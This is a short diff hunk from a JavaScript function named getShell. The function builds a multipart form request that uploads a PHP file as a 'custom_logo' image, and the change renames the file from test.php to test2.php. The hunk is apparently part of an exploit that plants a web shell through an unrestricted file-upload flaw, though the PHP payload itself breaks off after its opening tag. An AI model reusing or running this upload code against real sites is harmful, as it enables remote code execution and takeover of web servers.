@@ -15,7 +15,7 @@ function getShell(token)
           "\r\n" + 
           "\r\n" + 
           "------WebKitFormBoundary9NusbnXAbeadLnUh\r\n" + 
-          "Content-Disposition: form-data; name=\"custom_logo\"; filename=\"test.php\"\r\n" + 
+          "Content-Disposition: form-data; name=\"custom_logo\"; filename=\"test2.php\"\r\n" + 
           "Content-Type: text/php\r\n" + 
           "\r\n" + 
           "\x3c?php\n" + 
